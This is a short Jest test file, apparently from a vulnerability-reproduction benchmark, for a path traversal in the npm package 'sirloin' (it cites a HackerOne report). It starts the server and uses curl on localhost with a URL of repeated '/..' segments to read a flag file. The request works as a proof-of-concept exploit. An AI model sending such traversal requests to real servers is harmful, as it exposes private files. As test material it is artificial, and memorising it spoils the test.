//https://hackerone.com/reports/790623

const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in sirloin", (done) => {
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  serv = "nodejs node_modules/sirloin/bin/sirloin.js";
  exec(serv, (error, stdout) => {
    let attack_string = `curl "http://127.0.0.1:3006${genstr()}"`;

    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      done();
    });
  });
});
